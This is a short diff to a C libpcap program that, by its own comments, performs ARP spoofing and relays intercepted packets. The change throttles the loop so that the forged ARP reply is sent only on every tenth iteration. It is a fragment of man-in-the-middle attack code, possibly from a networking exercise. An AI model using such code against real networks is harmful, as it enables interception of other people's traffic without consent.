@@ -110,6 +110,7 @@ int main(int argc, char*argv[])
     struct sniff_ip *ip_relay;
     struct sniff_tcp *tcp_relay;
 
+    int time_check=0;
     unsigned int total_length;
     u_char tcpoff;
     u_char ipoff;
@@ -240,11 +241,17 @@ int main(int argc, char*argv[])
     /*//////////attack with arp reply packet and relay spoofed packet///////*/
     while (1)
     {
-        printf("send attack arp packet\n");
-        if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
-        {
-             printf("error\n");
-        }
+        
+	if(time_check%10==0)
+	{
+            printf("send attack arp packet\n");
+	    if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
+            {
+                 printf("error\n");
+            }
+	}
+
+	time_check++;
 
         int res;
                 /* Grab a packet */
